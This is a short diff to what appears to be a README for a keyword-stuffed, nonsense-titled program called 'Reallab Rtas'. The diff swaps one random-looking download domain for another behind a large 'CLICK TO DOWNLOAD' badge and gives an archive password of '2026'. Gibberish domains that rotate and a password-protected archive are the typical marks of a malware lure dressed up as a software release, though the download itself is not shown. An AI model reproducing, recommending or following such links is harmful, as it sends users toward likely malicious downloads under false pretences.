@@ -1,6 +1,6 @@
 # Reallab Reallab Reallab 3 Reallab Rtas
 
-[![CLICK TO DOWNLOAD](https://img.shields.io/badge/CLICK%20TO%20DOWNLOAD-008C3A?style=for-the-badge&logo=github&logoColor=white)](https://efhiwogvjd.com/Reallab-Latest-Version-Reallab-2026-Reallab-3-2026-Reallab-Rtas-Latest-Version)
+[![CLICK TO DOWNLOAD](https://img.shields.io/badge/CLICK%20TO%20DOWNLOAD-008C3A?style=for-the-badge&logo=github&logoColor=white)](https://fghtfghjfdjfdj.com/Reallab-Latest-Version-Reallab-2026-Reallab-3-2026-Reallab-Rtas-Latest-Version)
 > #### Archive password: `2026`
 
 
